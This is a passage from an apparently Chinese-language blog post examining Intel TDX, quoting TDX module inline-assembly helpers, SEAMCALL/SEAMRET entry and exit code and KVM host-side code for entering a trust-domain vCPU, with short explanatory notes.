class=\"line\">    <span class=\"keyword\">return</span> dr0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">uint64_t</span> <span class=\"title function_\">ia32_store_dr1</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> dr1;</span><br><span class=\"line\">    _ASM_VOLATILE_ (<span class=\"string\">&quot;mov %%dr1, %0&quot;</span> : <span class=\"string\">&quot;=r&quot;</span> (dr1));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dr1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">uint64_t</span> <span class=\"title function_\">ia32_rdmsr</span><span class=\"params\">(<span class=\"type\">uint64_t</span> addr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> low,high;</span><br><span class=\"line\">    _ASM_VOLATILE_ (<span class=\"string\">&quot;rdmsr&quot;</span> : <span class=\"string\">&quot;=a&quot;</span>(low), <span class=\"string\">&quot;=d&quot;</span>(high) : <span class=\"string\">&quot;c&quot;</span>(addr));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"type\">uint64_t</span>)((((<span class=\"type\">uint64_t</span>)(high)) &lt;&lt; <span class=\"number\">32</span>) | (<span class=\"type\">uint64_t</span>)(low));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">ia32_xsaves</span><span class=\"params\">(<span class=\"type\">void</span>* xsave_area, <span class=\"type\">uint64_t</span> xfam)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    _ASM_VOLATILE_ ( <span class=\"string\">&quot;xsaves %0 \\n&quot;</span> : <span class=\"string\">&quot;=m&quot;</span>(*((<span class=\"type\">uint64_t</span> *)xsave_area)) : <span class=\"string\">&quot;d&quot;</span>((<span class=\"type\">uint32_t</span>)(xfam &gt;&gt; <span class=\"number\">32</span>)),</span><br><span class=\"line\">            <span class=\"string\">&quot;a&quot;</span>((<span class=\"type\">uint32_t</span>)xfam) : <span class=\"string\">&quot;memory&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">ia32_xseglobaltbv</span><span class=\"params\">(<span class=\"type\">uint64_t</span> xcr, <span class=\"type\">uint64_t</span> value)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    _ASM_VOLATILE_ (<span class=\"string\">&quot;xsetbv&quot;</span> : : <span class=\"string\">&quot;a&quot;</span>((<span class=\"type\">uint32_t</span>)value), <span class=\"string\">&quot;d&quot;</span>((<span class=\"type\">uint32_t</span>)(value &gt;&gt; <span class=\"number\">32</span>)), <span class=\"string\">&quot;c&quot;</span>(xcr));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">uint16_t</span> _lock_xadd_16b(<span class=\"type\">uint16_t</span> *mem, <span class=\"type\">uint16_t</span> quantum)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    _ASM_VOLATILE_ (<span class=\"string\">&quot;lock; xaddw %2, %0&quot;</span> : <span class=\"string\">&quot;=m&quot;</span> ( *mem ), <span class=\"string\">&quot;=a&quot;</span>(quantum) : <span class=\"string\">&quot;a&quot;</span>(quantum) : <span class=\"string\">&quot;memory&quot;</span>, <span class=\"string\">&quot;cc&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> quantum;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * @brief Write to VMCS entry</span></span><br><span class=\"line\"><span class=\"comment\"> * @param encoding</span></span><br><span class=\"line\"><span class=\"comment\"> * @param value</span></span><br><span class=\"line\"><span class=\"comment\"> * @return</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">ia32_vmwrite</span><span class=\"params\">(<span class=\"type\">uint64_t</span> encoding, <span class=\"type\">uint64_t</span> value)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//According to SDM, in 64-bit mode the instruction will fail is given an</span></span><br><span class=\"line\">    <span class=\"comment\">//operand that sets encoding bit beyond 32-bit</span></span><br><span class=\"line\">    tdx_debug_assert(encoding &lt; BIT(<span class=\"number\">32</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//asm instruction expects both operands to be 64bit.</span></span><br><span class=\"line\">    <span class=\"type\">ia32_rflags_t</span> rflags;</span><br><span class=\"line\">    _ASM_VOLATILE_ (<span class=\"string\">&quot;vmwriteq %1,%2\\n&quot;</span></span><br><span class=\"line\">                        <span class=\"string\">&quot;pushfq\\n&quot;</span></span><br><span class=\"line\">                        <span class=\"string\">&quot;popq %0&quot;</span></span><br><span class=\"line\">                        : <span class=\"string\">&quot;=r&quot;</span>(rflags.raw)</span><br><span class=\"line\">            :<span class=\"string\">&quot;r&quot;</span>(value), <span class=\"string\">&quot;r&quot;</span>(encoding)</span><br><span class=\"line\">            : <span class=\"string\">&quot;cc&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        tdx_sanity_check((rflags.cf == <span class=\"number\">0</span> &amp;&amp; rflags.zf == <span class=\"number\">0</span>), SCEC_VT_ACCESSORS_SOURCE, (<span class=\"type\">uint32_t</span>)encoding);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * @brief Load pointer to VMCS</span></span><br><span class=\"line\"><span class=\"comment\"> * @param vmcs_p</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">ia32_vmptrld</span><span class=\"params\">(<span class=\"type\">vmcs_ptr_t</span> *vmcs_p)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">ia32_rflags_t</span> rflags;</span><br><span class=\"line\">        _ASM_VOLATILE_ (<span class=\"string\">&quot;vmptrld %1\\n&quot;</span></span><br><span class=\"line\">                    <span class=\"string\">&quot;pushfq\\n&quot;</span></span><br><span class=\"line\">                    <span class=\"string\">&quot;popq %0\\n&quot;</span></span><br><span class=\"line\">                    : <span class=\"string\">&quot;=r&quot;</span>(rflags.raw)</span><br><span class=\"line\">                        :<span class=\"string\">&quot;m&quot;</span>(vmcs_p):<span class=\"string\">&quot;memory&quot;</span> , <span class=\"string\">&quot;cc&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Runtime assert - VMPTRLD should always succeed</span></span><br><span class=\"line\">        tdx_sanity_check((rflags.cf == <span class=\"number\">0</span> &amp;&amp; rflags.zf == <span class=\"number\">0</span>), SCEC_VT_ACCESSORS_SOURCE, <span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.section .text</span><br><span class=\"line\">.globl tdx_seamret_to_vmm</span><br><span class=\"line\">.type  tdx_seamret_to_vmm,@function</span><br><span class=\"line\">tdx_seamret_to_vmm:</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Restore all VMM GPRs on module entry from LP local data</span><br><span class=\"line\">     * Local data is located at GSBASE</span><br><span class=\"line\">     */</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET,     %rax</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+8,   %rcx</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+16,  %rdx</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+24,  %rbx</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+32,  %rsp // not actually needed</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+40,  %rbp</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+48,  %rsi</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+56,  %rdi</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+64,  %r8</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+72,  %r9</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+80,  %r10</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+88,  %r11</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+96,  %r12</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+104, %r13</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+112, %r14</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+120, %r15</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Call SEAMRET</span><br><span class=\"line\">     */</span><br><span class=\"line\">        .byte 0x66, 0x0F, 0x01, 0xCD</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * No accesible code from this point</span><br><span class=\"line\">     * Panic with UD2 if reached</span><br><span class=\"line\">     */</span><br><span class=\"line\">    ud2.section .text</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>读写内存</li>\n<li>汇编指令</li>\n<li>if 不确定是否成立</li>\n<li>循环不确定次数</li>\n</ul>\n<h3 id=\"Seamcall\"><a href=\"#Seamcall\" class=\"headerlink\" title=\"Seamcall\"></a>Seamcall</h3><p>host 侧：</p>\n<p><a href=\"https://github.com/intel/tdx/blob/kvm-upstream/arch/x86/kvm/vmx/tdx.c\">https://github.com/intel/tdx/blob/kvm-upstream/arch/x86/kvm/vmx/tdx.c</a></p>\n<p>rax&#x3D;0  前 16bit 表示 seamcall 的动作  0 表示 vmlaunch&#x2F;vmresume</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinstr <span class=\"type\">void</span> <span class=\"title function_\">tdx_vcpu_enter_exit</span><span class=\"params\">(<span class=\"keyword\">struct</span> vcpu_tdx *tdx)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tdx_module_args</span> <span class=\"title\">args</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Avoid section mismatch with to_tdx() with KVM_VM_BUG().  The caller</span></span><br><span class=\"line\"><span class=\"comment\">         * should call to_tdx().</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_vcpu</span> *<span class=\"title\">vcpu</span> =</span> &amp;tdx-&gt;vcpu;</span><br><span class=\"line\"></span><br><span class=\"line\">        guest_state_enter_irqoff();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * <span class=\"doctag\">TODO:</span> optimization:</span></span><br><span class=\"line\"><span class=\"comment\">         * - Eliminate copy between args and vcpu-&gt;arch.regs.</span></span><br><span class=\"line\"><span class=\"comment\">         * - copyin/copyout registers only if (tdx-&gt;tdvmvall.regs_mask != 0)</span></span><br><span class=\"line\"><span class=\"comment\">         *   which means TDG.VP.VMCALL.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        args = (<span class=\"keyword\">struct</span> tdx_module_args) &#123;</span><br><span class=\"line\">                .rcx = tdx-&gt;tdvpr_pa,</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REG(reg, REG)        .reg = vcpu-&gt;arch.regs[VCPU_REGS_ ## REG]</span></span><br><span class=\"line\">                REG(rdx, RDX),</span><br><span class=\"line\">                REG(r8,  R8),</span><br><span class=\"line\">                REG(r9,  R9),</span><br><span class=\"line\">                REG(r10, R10),</span><br><span class=\"line\">                REG(r11, R11),</span><br><span class=\"line\">                REG(r12, R12),</span><br><span class=\"line\">                REG(r13, R13),</span><br><span class=\"line\">                REG(r14, R14),</span><br><span class=\"line\">                REG(r15, R15),</span><br><span class=\"line\">                REG(rbx, RBX),</span><br><span class=\"line\">                REG(rdi, RDI),</span><br><span class=\"line\">                REG(rsi, RSI),</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> REG</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        tdx-&gt;exit_reason.full = __seamcall_saved_ret(TDH_VP_ENTER, &amp;args);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REG(reg, REG)        vcpu-&gt;arch.regs[VCPU_REGS_ ## REG] = args.reg</span></span><br><span class=\"line\">                REG(rcx, RCX);</span><br><span class=\"line\">                REG(rdx, RDX);</span><br><span class=\"line\">                REG(r8,  R8);</span><br><span class=\"line\">                REG(r9,  R9);</span><br><span class=\"line\">                REG(r10, R10);</span><br><span class=\"line\">                REG(r11, R11);</span><br><span class=\"line\">                REG(r12, R12);</span><br><span class=\"line\">                REG(r13, R13);</span><br><span class=\"line\">                REG(r14, R14);</span><br><span class=\"line\">                REG(r15, R15);</span><br><span class=\"line\">                REG(rbx, RBX);</span><br><span class=\"line\">                REG(rdi, RDI);</span><br><span class=\"line\">                REG(rsi, RSI);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> REG</span></span><br><span class=\"line\"></span><br><span class=\"line\">        WARN_ON_ONCE(!kvm_rebooting &amp;&amp;</span><br><span class=\"line\">                     (tdx-&gt;exit_reason.full &amp; TDX_SW_ERROR) == TDX_SW_ERROR);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((u16)tdx-&gt;exit_reason.basic == EXIT_REASON_EXCEPTION_NMI &amp;&amp;</span><br><span class=\"line\">            is_nmi(tdexit_intr_info(vcpu))) &#123;</span><br><span class=\"line\">                kvm_before_interrupt(vcpu, KVM_HANDLING_NMI);</span><br><span class=\"line\">                vmx_do_nmi_irqoff();</span><br><span class=\"line\">                kvm_after_interrupt(vcpu);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        guest_state_exit_irqoff();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>把需要 tdx module 处理使用的参数通过寄存器传入  也是类似 function call</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.macro TDX_MODULE_CALL host:req ret=0 saved=0</span><br><span class=\"line\">        FRAME_BEGIN</span><br><span class=\"line\"></span><br><span class=\"line\">        /* Move Leaf ID to RAX */</span><br><span class=\"line\">        mov %rdi, %rax</span><br><span class=\"line\"></span><br><span class=\"line\">        /* Move other input regs from &#x27;struct tdx_module_args&#x27; */</span><br><span class=\"line\">        movq        TDX_MODULE_rcx(%rsi), %rcx</span><br><span class=\"line\">        movq        TDX_MODULE_rdx(%rsi), %rdx</span><br><span class=\"line\">        movq        TDX_MODULE_r8(%rsi),  %r8</span><br><span class=\"line\">        movq        TDX_MODULE_r9(%rsi),  %r9</span><br><span class=\"line\">        movq        TDX_MODULE_r10(%rsi), %r10</span><br><span class=\"line\">        movq        TDX_MODULE_r11(%rsi), %r11</span><br><span class=\"line\"></span><br><span class=\"line\">.if \\saved</span><br><span class=\"line\">        /*</span><br><span class=\"line\">         * Move additional input regs from the structure.  For simplicity</span><br><span class=\"line\">         * assume that anything needs the callee-saved regs also tramples</span><br><span class=\"line\">         * on RDI/RSI (see VP.ENTER).</span><br><span class=\"line\">         */</span><br><span class=\"line\">        /* Save those callee-saved GPRs as mandated by the x86_64 ABI */</span><br><span class=\"line\">        pushq        %rbx</span><br><span class=\"line\">        pushq        %r12</span><br><span class=\"line\">        pushq        %r13</span><br><span class=\"line\">        pushq        %r14</span><br><span class=\"line\">        pushq        %r15</span><br><span class=\"line\"></span><br><span class=\"line\">        movq        TDX_MODULE_r12(%rsi), %r12</span><br><span class=\"line\">        movq        TDX_MODULE_r13(%rsi), %r13</span><br><span class=\"line\">        movq        TDX_MODULE_r14(%rsi), %r14</span><br><span class=\"line\">        movq        TDX_MODULE_r15(%rsi), %r15</span><br><span class=\"line\">        movq        TDX_MODULE_rbx(%rsi), %rbx</span><br><span class=\"line\"></span><br><span class=\"line\">.if \\ret</span><br><span class=\"line\">        /* Save the structure pointer as RSI is about to be clobbered */</span><br><span class=\"line\">        pushq        %rsi</span><br><span class=\"line\">.endif</span><br><span class=\"line\"></span><br><span class=\"line\">        movq        TDX_MODULE_rdi(%rsi), %rdi</span><br><span class=\"line\">        /* RSI needs to be done at last */</span><br><span class=\"line\">        movq        TDX_MODULE_rsi(%rsi), %rsi</span><br><span class=\"line\">.endif        /* \\saved */</span><br><span class=\"line\"></span><br><span class=\"line\">.if \\host</span><br><span class=\"line\">.Lseamcall\\@:</span><br><span class=\"line\">        seamcall</span><br><span class=\"line\">        /*</span><br><span class=\"line\">         * SEAMCALL instruction is essentially a VMExit from VMX root</span><br><span class=\"line\">         * mode to SEAM VMX root mode.  VMfailInvalid (CF=1) indicates</span><br><span class=\"line\">         * that the targeted SEAM firmware is not loaded or disabled,</span><br><span class=\"line\">         * or P-SEAMLDR is busy with another SEAMCALL.  %rax is not</span><br><span class=\"line\">         * changed in this case.</span><br><span class=\"line\">         *</span><br><span class=\"line\">         * Set %rax to TDX_SEAMCALL_VMFAILINVALID for VMfailInvalid.</span><br><span class=\"line\">         * This value will never be used as actual SEAMCALL error code as</span><br><span class=\"line\">         * it is from the Reserved status code class.</span><br><span class=\"line\">         */</span><br><span class=\"line\">        jc .Lseamcall_vmfailinvalid\\@</span><br><span class=\"line\">.else</span><br><span class=\"line\">        tdcall</span><br><span class=\"line\">.endif</span><br><span class=\"line\"></span><br><span class=\"line\">.if \\ret</span><br><span class=\"line\">.if \\saved</span><br><span class=\"line\">        /*</span><br><span class=\"line\">         * Restore the structure from stack to save the output registers</span><br><span class=\"line\">         *</span><br><span class=\"line\">         * In case of VP.ENTER returns due to TDVMCALL, all registers are</span><br><span class=\"line\">         * valid thus no register can be used as spare to restore the</span><br><span class=\"line\">         * structure from the stack (see &quot;TDH.VP.ENTER Output Operands</span><br><span class=\"line\">         * Definition on TDCALL(TDG.VP.VMCALL) Following a TD Entry&quot;).</span><br><span class=\"line\">         * For this case, need to make one register as spare by saving it</span><br><span class=\"line\">         * to the stack and then manually load the structure pointer to</span><br><span class=\"line\">         * the spare register.</span><br><span class=\"line\">         *</span><br><span class=\"line\">         * Note for other TDCALLs/SEAMCALLs there are spare registers</span><br><span class=\"line\">         * thus no need for such hack but just use this for all.</span><br><span class=\"line\">         */</span><br><span class=\"line\">        pushq        %rax                /* save the TDCALL/SEAMCALL return code */</span><br><span class=\"line\">        movq        8(%rsp), %rax        /* restore the structure pointer */</span><br><span class=\"line\">        movq        %rsi, TDX_MODULE_rsi(%rax)        /* save RSI */</span><br><span class=\"line\">        popq        %rax                /* restore the return code */</span><br><span class=\"line\">        popq        %rsi                /* pop the structure pointer */</span><br><span class=\"line\"></span><br><span class=\"line\">        /* Copy additional output regs to the structure  */</span><br><span class=\"line\">        movq %r12, TDX_MODULE_r12(%rsi)</span><br><span class=\"line\">        movq %r13, TDX_MODULE_r13(%rsi)</span><br><span class=\"line\">        movq %r14, TDX_MODULE_r14(%rsi)</span><br><span class=\"line\">        movq %r15, TDX_MODULE_r15(%rsi)</span><br><span class=\"line\">        movq %rbx, TDX_MODULE_rbx(%rsi)</span><br><span class=\"line\">        movq %rdi, TDX_MODULE_rdi(%rsi)</span><br><span class=\"line\">.endif        /* \\saved */</span><br><span class=\"line\"></span><br><span class=\"line\">        /* Copy output registers to the structure */</span><br><span class=\"line\">        movq %rcx, TDX_MODULE_rcx(%rsi)</span><br><span class=\"line\">        movq %rdx, TDX_MODULE_rdx(%rsi)</span><br><span class=\"line\">        movq %r8,  TDX_MODULE_r8(%rsi)</span><br><span class=\"line\">        movq %r9,  TDX_MODULE_r9(%rsi)</span><br><span class=\"line\">        movq %r10, TDX_MODULE_r10(%rsi)</span><br><span class=\"line\">        movq %r11, TDX_MODULE_r11(%rsi)</span><br><span class=\"line\">.endif        /* \\ret */</span><br><span class=\"line\"></span><br><span class=\"line\">.if \\saved &amp;&amp; \\ret</span><br><span class=\"line\">        /*</span><br><span class=\"line\">         * Clear registers shared by guest for VP.VMCALL/VP.ENTER to prevent</span><br><span class=\"line\">         * speculative use of guest&#x27;s/VMM&#x27;s values, including those are</span><br><span class=\"line\">         * restored from the stack.</span><br><span class=\"line\">         *</span><br><span class=\"line\">         * See arch/x86/kvm/vmx/vmenter.S:</span><br><span class=\"line\">         *</span><br><span class=\"line\">         * In theory, a L1 cache miss when restoring register from stack</span><br><span class=\"line\">         * could lead to speculative execution with guest&#x27;s values.</span><br><span class=\"line\">         *</span><br><span class=\"line\">         * Note: RBP/RSP are not used as shared register.  RSI has been</span><br><span class=\"line\">         * restored already.</span><br><span class=\"line\">         *</span><br><span class=\"line\">         * XOR is cheap, thus unconditionally do for all leafs.</span><br><span class=\"line\">         */</span><br><span class=\"line\">        xorl %ecx,  %ecx</span><br><span class=\"line\">        xorl %edx,  %edx</span><br><span class=\"line\">        xorl %r8d,  %r8d</span><br><span class=\"line\">        xorl %r9d,  %r9d</span><br><span class=\"line\">        xorl %r10d, %r10d</span><br><span class=\"line\">        xorl %r11d, %r11d</span><br><span class=\"line\">        xorl %r12d, %r12d</span><br><span class=\"line\">        xorl %r13d, %r13d</span><br><span class=\"line\">        xorl %r14d, %r14d</span><br><span class=\"line\">        xorl %r15d, %r15d</span><br><span class=\"line\">        xorl %ebx,  %ebx</span><br><span class=\"line\">        xorl %edi,  %edi</span><br><span class=\"line\">.endif        /* \\ret &amp;&amp; \\host */</span><br><span class=\"line\"></span><br><span class=\"line\">.if \\host</span><br><span class=\"line\">.Lout\\@:</span><br><span class=\"line\">.endif</span><br><span class=\"line\"></span><br><span class=\"line\">.if \\saved</span><br><span class=\"line\">        /* Restore callee-saved GPRs as mandated by the x86_64 ABI */</span><br><span class=\"line\">        popq        %r15</span><br><span class=\"line\">        popq        %r14</span><br><span class=\"line\">        popq        %r13</span><br><span class=\"line\">        popq        %r12</span><br><span class=\"line\">        popq        %rbx</span><br><span class=\"line\">.endif        /* \\saved */</span><br><span class=\"line\"></span><br><span class=\"line\">        FRAME_END</span><br><span class=\"line\">        RET</span><br><span class=\"line\"></span><br><span class=\"line\">.if \\host</span><br><span class=\"line\">.Lseamcall_vmfailinvalid\\@:</span><br><span class=\"line\">        mov $TDX_SEAMCALL_VMFAILINVALID, %rax</span><br><span class=\"line\">        jmp .Lseamcall_fail\\@</span><br><span class=\"line\"></span><br><span class=\"line\">.Lseamcall_trap\\@:</span><br><span class=\"line\">        /*</span><br><span class=\"line\">         * SEAMCALL caused #GP or #UD.  By reaching here RAX contains</span><br><span class=\"line\">         * the trap number.  Convert the trap number to the TDX error</span><br><span class=\"line\">         * code by setting TDX_SW_ERROR to the high 32-bits of RAX.</span><br><span class=\"line\">         *</span><br><span class=\"line\">         * Note cannot OR TDX_SW_ERROR directly to RAX as OR instruction</span><br><span class=\"line\">         * only accepts 32-bit immediate at most.</span><br><span class=\"line\">         */</span><br><span class=\"line\">        movq $TDX_SW_ERROR, %rdi</span><br><span class=\"line\">        orq  %rdi, %rax</span><br><span class=\"line\"></span><br><span class=\"line\">.Lseamcall_fail\\@:</span><br><span class=\"line\">.if \\ret &amp;&amp; \\saved</span><br><span class=\"line\">        /* pop the unused structure pointer back to RSI */</span><br><span class=\"line\">        popq %rsi</span><br><span class=\"line\">.endif</span><br><span class=\"line\">        jmp .Lout\\@</span><br><span class=\"line\"></span><br><span class=\"line\">        _ASM_EXTABLE_FAULT(.Lseamcall\\@, .Lseamcall_trap\\@)</span><br><span class=\"line\">.endif        /* \\host */</span><br><span class=\"line\"></span><br><span class=\"line\">.endm</span><br></pre></td></tr></table></figure>\n\n<p>Tdx module:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.section .text</span><br><span class=\"line\">.globl tdx_seamcall_entry_point</span><br><span class=\"line\">.type  tdx_seamcall_entry_point,@function</span><br><span class=\"line\">tdx_seamcall_entry_point:</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Save all VMM GPRs on module entry to LP local data</span><br><span class=\"line\">     * Local data is located at GSBASE</span><br><span class=\"line\">     */</span><br><span class=\"line\">    movq %rax,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET</span><br><span class=\"line\">    movq %rcx,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+8</span><br><span class=\"line\">    movq %rdx,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+16</span><br><span class=\"line\">    movq %rbx,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+24</span><br><span class=\"line\">    movq %rsp,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+32 // not actually needed</span><br><span class=\"line\">    movq %rbp,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+40</span><br><span class=\"line\">    movq %rsi,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+48</span><br><span class=\"line\">    movq %rdi,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+56</span><br><span class=\"line\">    movq %r8,   %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+64</span><br><span class=\"line\">    movq %r9,   %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+72</span><br><span class=\"line\">    movq %r10,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+80</span><br><span class=\"line\">    movq %r11,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+88</span><br><span class=\"line\">    movq %r12,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+96</span><br><span class=\"line\">    movq %r13,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+104</span><br><span class=\"line\">    movq %r14,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+112</span><br><span class=\"line\">    movq %r15,  %gs:TDX_LOCAL_DATA_VMM_GPRS_STATE_OFFSET+120</span><br><span class=\"line\"></span><br><span class=\"line\">        /*</span><br><span class=\"line\">         * clear VMM GPRs on entry to the TDX module</span><br><span class=\"line\">         */</span><br><span class=\"line\">    xor %rax, %rax</span><br><span class=\"line\">    xor %rcx, %rcx</span><br><span class=\"line\">    xor %rdx, %rdx</span><br><span class=\"line\">    xor %rbx, %rbx</span><br><span class=\"line\">    xor %rbp, %rbp</span><br><span class=\"line\">    xor %rsi, %rsi</span><br><span class=\"line\">    xor %rdi, %rdi</span><br><span class=\"line\">    xor %r8, %r8</span><br><span class=\"line\">    xor %r9, %r9</span><br><span class=\"line\">    xor %r10, %r10</span><br><span class=\"line\">    xor %r11, %r11</span><br><span class=\"line\">    xor %r12, %r12</span><br><span class=\"line\">    xor %r13, %r13</span><br><span class=\"line\">    xor %r14, %r14</span><br><span class=\"line\">    xor %r15, %r15</span><br><span class=\"line\"></span><br><span class=\"line\">    // Protection against speculative attacks on GPRs</span><br><span class=\"line\">    lfence</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Call the VMM API dispatcher</span><br><span class=\"line\">     */</span><br><span class=\"line\">     callq tdx_vmm_dispatcher</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Dispatcher should not retrun to this code</span><br><span class=\"line\">     * It returns to the VMM using SEAMRET</span><br><span class=\"line\">     * Panic with UD2 if reached</span><br><span class=\"line\">     */</span><br><span class=\"line\">    ud2</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">tdx_vmm_dispatcher</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Must be first thing to do before accessing local/global data or sysinfo table</span></span><br><span class=\"line\">    <span class=\"type\">tdx_module_local_t</span>* local_data = init_data_fast_ref_ptrs();</span><br><span class=\"line\">        _STATIC_INLINE_ <span class=\"type\">tdx_module_local_t</span>* <span class=\"title function_\">init_data_fast_ref_ptrs</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"type\">tdx_module_local_t</span>* local_data = calculate_local_data();</span><br><span class=\"line\">                    <span class=\"comment\">// In SEAM TDX module, GSBASE holds a pointer to the local data of current thread</span></span><br><span class=\"line\">                    <span class=\"comment\">// We are reading GSBASE by loading effective address of 0 with GS prefix</span></span><br><span class=\"line\">                    _STATIC_INLINE_ <span 